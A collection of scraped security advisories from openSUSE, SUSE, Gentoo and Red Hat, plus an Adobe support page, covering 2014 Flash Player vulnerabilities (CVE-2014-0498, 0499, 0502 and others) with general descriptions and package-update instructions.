=== Content from lists.opensuse.org_1fe1afb4_20250111_013656.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/#D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7)

# [security-announce] SUSE-SU-2014:0290-1: critical: Security update for flash-player

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

25 Feb
2014

25 Feb
'14

19:04

SUSE Security Update: Security update for flash-player
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2014:0290-1
Rating: critical
References: #865021
Cross-References: CVE-2014-0498 CVE-2014-0499 CVE-2014-0502
Affected Products:
SUSE Linux Enterprise Desktop 11 SP3
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes three vulnerabilities is now
available. It includes one version update.
Description:
This update of Adobe Flash Player fixes the following
issues:
\* A stack overflow vulnerability that could have
resulted in arbitrary code execution. (CVE-2014-0498)
\* A memory leak vulnerability that could have been used
to defeat memory address layout randomization.
(CVE-2014-0499)
\* A double free vulnerability that could have resulted
in arbitrary code execution. (CVE-2014-0502)
Security Issue references:
\* CVE-2014-0498
<<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0498>

...

\* CVE-2014-0499
<<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0499>

...

\* CVE-2014-0502
<<http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0502>

...

Patch Instructions:
To install this SUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- SUSE Linux Enterprise Desktop 11 SP3:
zypper in -t patch sledsp3-flash-player-8922
To bring your system up-to-date, use "zypper patch".
Package List:
- SUSE Linux Enterprise Desktop 11 SP3 (i586 x86\_64) [New Version: 11.2.202.341]:
flash-player-11.2.202.341-0.3.1
flash-player-gnome-11.2.202.341-0.3.1
flash-player-kde4-11.2.202.341-0.3.1
References:
<http://support.novell.com/security/cve/CVE-2014-0498.html>
<http://support.novell.com/security/cve/CVE-2014-0499.html>
<http://support.novell.com/security/cve/CVE-2014-0502.html>
<https://bugzilla.novell.com/865021>
[http://download.novell.com/patch/finder/?keywords=6003a7ba1dd825daf2236b5435...](http://download.novell.com/patch/finder/?keywords=6003a7ba1dd825daf2236b54355b2495)
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7/#D3BYNRD5U4PMJJBKBUXU3VUSOSRUQJZ7)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from lists.opensuse.org_fe48c1f7_20250111_013656.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/#T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ)

# [security-announce] openSUSE-SU-2014:0278-1: critical: flash-player: update to 11.2.202.341 security release

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

24 Feb
2014

24 Feb
'14

10:04

openSUSE Security Update: flash-player: update to 11.2.202.341 security release
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:0278-1
Rating: critical
References: #865021
Cross-References: CVE-2014-0498 CVE-2014-0499 CVE-2014-0502
Affected Products:
openSUSE 11.4
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes three vulnerabilities is now available.
Description:
Adobe Flash Player was updated to 11.2.202.341: (bnc#865021)
\* APSB14-07, CVE-2014-0498 CVE-2014-0499 CVE-2014-0502
- Contents of flashplayer\_11\_sa.i386.tar.gz changed back:
spec file updated, supplementary script (update.sh)
updated.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 11.4:
zypper in -t patch 2014-22
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 11.4 (i586 x86\_64):
flash-player-11.2.202.341-95.1
flash-player-gnome-11.2.202.341-95.1
flash-player-kde4-11.2.202.341-95.1
References:
<http://support.novell.com/security/cve/CVE-2014-0498.html>
<http://support.novell.com/security/cve/CVE-2014-0499.html>
<http://support.novell.com/security/cve/CVE-2014-0502.html>
<https://bugzilla.novell.com/865021>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ/#T2FFA6C27X6ACZPQSGGSKSSQ5TALLIHZ)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from security.gentoo.org_626399ad_20250111_013658.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Adobe Flash Player: Multiple vulnerabilities — GLSA **201405-04**

Multiple vulnerabilities have been found in Adobe Flash Player, the
worst of which could result in execution of arbitrary code.

### Affected packages

| Package | **www-plugins/adobe-flash** on all architectures |
| --- | --- |
| Affected versions | < **11.2.202.356** |
| Unaffected versions | >= **11.2.202.356** |

### Background

The Adobe Flash Player is a renderer for the SWF file format, which is
commonly used to provide interactive websites.

### Description

Multiple vulnerabilities have been discovered in Adobe Flash Player.
Please review the CVE identifiers referenced below for details.

### Impact

A remote attacker could entice a user to open a specially crafted SWF
file using Adobe Flash Player, possibly resulting in execution of
arbitrary code with the privileges of the process or a Denial of Service
condition. Furthermore, a remote attacker may be able to bypass the Same
Origin Policy or read the clipboard via unspecified vectors.

### Workaround

There is no known workaround at this time.

### Resolution

All Adobe Flash Player users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=www-plugins/adobe-flash-11.2.202.356"

```
### References

* [CVE-2014-0498](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0498)
* [CVE-2014-0499](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0499)
* [CVE-2014-0502](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0502)
* [CVE-2014-0503](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0503)
* [CVE-2014-0504](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0504)
* [CVE-2014-0506](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0506)
* [CVE-2014-0507](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0507)
* [CVE-2014-0508](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0508)
* [CVE-2014-0509](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0509)
* [CVE-2014-0515](https://nvd.nist.gov/nvd.cfm?cvename=CVE-2014-0515)

**Release date**

May 03, 2014

**Latest revision**

May 03, 2014: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [501960](https://bugs.gentoo.org/show_bug.cgi?id=501960)
* [504286](https://bugs.gentoo.org/show_bug.cgi?id=504286)
* [507176](https://bugs.gentoo.org/show_bug.cgi?id=507176)
* [508986](https://bugs.gentoo.org/show_bug.cgi?id=508986)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from helpx.adobe.com_fb4d1670_20250111_013655.html ===


# Free and discontinued products | Support options

Search

Last updated on
Dec 13, 2024

Learn which Adobe products have been discontinued, and what support resources are available.

Adobe occasionally discontinues the sale, development, or support of a product or technology due to changing market conditions and their impact on customers. Phone and chat support isn't available for free or discontinued software or services. Read more about the support and resources available to learn about discontinued products.

## Which Adobe products are no longer available or supported?

## Find your product

## Most common products

* [LeanPrint](#leanprint)
* [Muse](#Muse)
* [Flash Player](#flash-player)
* [Lightroom 6](#lightroom-6)
* [Font Folio](#font-folio)

---

## Don't see your product listed?

* **Subscription apps**: Adobe provides installers for only our current apps and the previous major version of each. For more information, see [Adobe software support guidelines](/support/programs/support-periods.html).
* **Non-subscription apps**: If your account is still active and you have purchased your app directly from Adobe or registered it, you may be able to [download from your account](/download-install/kb/downloaded-older-app.html).
* **Support resources**: They may not be available for products that are out of their support periods. See [Products and technical support periods](/support/programs/eol-matrix.html).

## Have more questions about discontinued Adobe products?

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

![Ask the Community](https://helpx-prod.scene7.com/is/image/HelpxProd/community-32?$png$&jpegSize=100&wid=83)

Join the [Adobe community](https://community.adobe.com/) to receive answers to your questions from our expert community members.

## More like this

* [Adobe product availability and support matrix](/support/programs/eol-matrix.html)
* [Adobe apps available for download](/download-install/kb/download-availability.html)
* [Adobe software support guidelines](/support/programs/cc-support-policy.html)

![](/content/dam/helpx/icons/adobe-logo.svg)

## **Get help faster and easier**

Sign in

New user?

Create an account ›

![Avatar]()

Manage account

Quick links

View all your plans
Manage your plans

View quick links

Hide quick links

[Legal Notices](/legal/legal-notices.html)    |    [Online Privacy Policy](https://www.adobe.com/privacy.html)

Share this page

* Copied

### Ask the Community

Post questions and get answers from experts.

[Ask now](https://community.adobe.com/)

### Contact Us

Real help from real people.

[Start now](/contact.html)

^ Back to top

Language Navigation

Language Navigation

Choose a region

Selecting a region changes the language and/or content on Adobe.com.

* Americas
* Brasil
* Canada - English
* Canada - Français
* Latinoamérica
* México
* Argentina
* Colombia
* Perú
* Chile
* United States
* Asia Pacific
* Australia
* Hong Kong S.A.R. of China
* India - English
* Indonesia - English
* Malaysia - English
* New Zealand
* Philippines - English
* Vietnam - English
* 中国
* 中國香港特別行政區
* 台灣地區
* 日本
* Indonesia
* Malaysia
* Pilipinas
* Việt Nam
* भारत
* 한국
* Singapore
* Thailand - English
* ประเทศไทย
* Europe, Middle East and Africa
* Africa - English
* België - Nederlands
* Belgique - Français
* Belgium - English
* Česká republika
* Danmark
* Deutschland
* Eesti
* España
* France
* Greece - English
* Ireland
* Israel - English
* Italia
* Latvija
* Lietuva
* Luxembourg - Deutsch
* Luxembourg - English
* Luxembourg - Français
* Magyarország
* Middle East and North Africa - English
* Nederland
* Norge
* Österreich
* Polska
* Portugal
* România
* Schweiz
* Slovenija
* Slovensko
* Suisse
* Suomi
* Svizzera
* Türkiye
* United Kingdom
* България
* Россия
* Україна
* الشرق الأوسط وشمال أفريقيا - اللغة العربية
* ישראל - עברית
* Sverige
* Saudi Arabia - English
* United Arab Emirates - English
* الإمارات العربية المتحدة
* المملكة العربية السعودية



=== Content from lists.opensuse.org_18865f4e_20250111_013656.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/#MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I)

# [security-announce] openSUSE-SU-2014:0277-1: critical: flash-player: update to 11.2.202.341 security release

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

24 Feb
2014

24 Feb
'14

07:04

openSUSE Security Update: flash-player: update to 11.2.202.341 security release
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2014:0277-1
Rating: critical
References: #865021
Cross-References: CVE-2014-0498 CVE-2014-0499 CVE-2014-0502
Affected Products:
openSUSE 13.1:NonFree
openSUSE 12.3:NonFree
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes three vulnerabilities is now available.
Description:
Adobe Flash Player was updated to 11.2.202.341: (bnc#865021)
\* APSB14-07, CVE-2014-0498 CVE-2014-0499 CVE-2014-0502
- Contents of flashplayer\_11\_sa.i386.tar.gz changed back:
spec file updated, supplementary script (update.sh)
updated.
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE 13.1:NonFree:
zypper in -t patch openSUSE-2014-157
- openSUSE 12.3:NonFree:
zypper in -t patch openSUSE-2014-157
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE 13.1:NonFree (i586 x86\_64):
flash-player-11.2.202.341-34.1
flash-player-gnome-11.2.202.341-34.1
flash-player-kde4-11.2.202.341-34.1
- openSUSE 12.3:NonFree (i586 x86\_64):
flash-player-11.2.202.341-2.60.1
flash-player-gnome-11.2.202.341-2.60.1
flash-player-kde4-11.2.202.341-2.60.1
References:
<http://support.novell.com/security/cve/CVE-2014-0498.html>
<http://support.novell.com/security/cve/CVE-2014-0499.html>
<http://support.novell.com/security/cve/CVE-2014-0502.html>
<https://bugzilla.novell.com/865021>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I/#MQKCKOSL55LVRI4SWNRZUSOYFEORHU7I)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from rhn.redhat.com_a1983e5e_20250111_013657.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2014:0196 - Security Advisory

Issued:
2014-02-21
Updated:
2014-02-21
# RHSA-2014:0196 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Critical: flash-plugin security update

## Type/Severity

Security Advisory: Critical

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2014%3A0196)

## Topic

An updated Adobe Flash Player package that fixes three security issues is
now available for Red Hat Enterprise Linux 5 and 6 Supplementary.

The Red Hat Security Response Team has rated this update as having Critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

The flash-plugin package contains a Mozilla Firefox compatible Adobe Flash
Player web browser plug-in.

This update fixes multiple vulnerabilities in Adobe Flash Player. These
vulnerabilities are detailed in the Adobe Security bulletin APSB14-07,
listed in the References section. Specially-crafted SWF content could
cause flash-plugin to crash or, potentially, execute arbitrary code when a
victim loads a page containing the malicious SWF content. (CVE-2014-0498,
CVE-2014-0499, CVE-2014-0502)

All users of Adobe Flash Player should install this updated package, which
upgrades Flash Player to version 11.2.202.341.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<https://access.redhat.com/site/articles/11258>

## Affected Products

* Red Hat Enterprise Linux Server 6 x86\_64
* Red Hat Enterprise Linux Server 6 i386
* Red Hat Enterprise Linux Server 5 x86\_64
* Red Hat Enterprise Linux Server 5 i386
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 6.5 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 6.5 i386
* Red Hat Enterprise Linux Server - AUS 6.5 x86\_64
* Red Hat Enterprise Linux Workstation 6 x86\_64
* Red Hat Enterprise Linux Workstation 6 i386
* Red Hat Enterprise Linux Workstation 5 x86\_64
* Red Hat Enterprise Linux Workstation 5 i386
* Red Hat Enterprise Linux Desktop 6 x86\_64
* Red Hat Enterprise Linux Desktop 6 i386
* Red Hat Enterprise Linux Desktop 5 x86\_64
* Red Hat Enterprise Linux Desktop 5 i386
* Red Hat Enterprise Linux Server from RHUI 6 x86\_64
* Red Hat Enterprise Linux Server from RHUI 6 i386
* Red Hat Enterprise Linux Server from RHUI 5 x86\_64
* Red Hat Enterprise Linux Server from RHUI 5 i386
* Red Hat Enterprise Linux Server - Extended Update Support from RHUI 6.5 x86\_64
* Red Hat Enterprise Linux Server - Extended Update Support from RHUI 6.5 i386

## Fixes

* [BZ - 1067656](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1067656)
  - CVE-2014-0498 CVE-2014-0499 CVE-2014-0502 flash-plugin: multiple flaws lead to arbitrary code execution (APSB14-07)

## CVEs

* [CVE-2014-0499](https://www.redhat.com/security/data/cve/CVE-2014-0499.html)
* [CVE-2014-0498](https://www.redhat.com/security/data/cve/CVE-2014-0498.html)
